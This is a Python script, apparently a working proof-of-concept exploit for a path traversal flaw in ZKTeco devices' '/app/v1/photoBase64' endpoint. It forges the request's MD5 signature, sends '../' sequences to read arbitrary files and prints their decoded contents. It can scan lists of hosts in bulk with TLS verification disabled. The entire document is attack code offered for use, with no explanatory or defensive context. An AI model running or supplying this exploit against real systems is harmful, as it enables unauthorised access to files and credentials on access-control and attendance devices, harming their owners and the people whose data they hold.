import hashlib
import requests
import base64
import argparse
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def parse_args():
    parser = argparse.ArgumentParser(description='ZKTeco path traversal script')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target host URL')
    group.add_argument('-l', '--list', type=argparse.FileType('r'), help='File containing list of URLs to check')
    parser.add_argument('-p', '--path', required=True, nargs='+', help='Path(s) to retrieve. Can be a single path or multiple paths')
    return parser.parse_args()


def process_path(host, path, headers, data):
    try:
        response = requests.post(f'{host}/app/v1/photoBase64', headers=headers, json=data, verify=False)
        if response.status_code == 200:
            print( f'[+] Vulnerable : {host}')
            print( f'[+] File content : {path} \n{base64.b64decode(response.json()["data"]).decode()}')
    except Exception as e:
        print(f"[-] Error {host}: {str(e)}")


def update_request(path):
    data = {}
    data['path'] = f"/../../../../../{path}"
    enc=hashlib.md5()
    data['nonce']="12345678901234567890"
    data['timestamp']=str(int(time.time())*1000)
    enc.update(data['path'].encode()+data['nonce'][4:16].encode()+data['timestamp'].encode())
    enc1=enc.hexdigest()
    data['sign'] = enc1.upper()
    return data


def main():
    args = parse_args()
    
    hosts = []
    if args.url:
        hosts = [args.url]
    else:
        hosts = [line.strip() for line in args.list if line.strip()]
        args.list.close()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
    }
    
    for host in hosts:
        if host[-1] == '/':
            host = host[:-1]
        headers['Host'] = host.split('://')[1] if '://' in host else host
        for path in args.path:
            process_path(host, path, headers, update_request(path))

if __name__ == '__main__':
    main()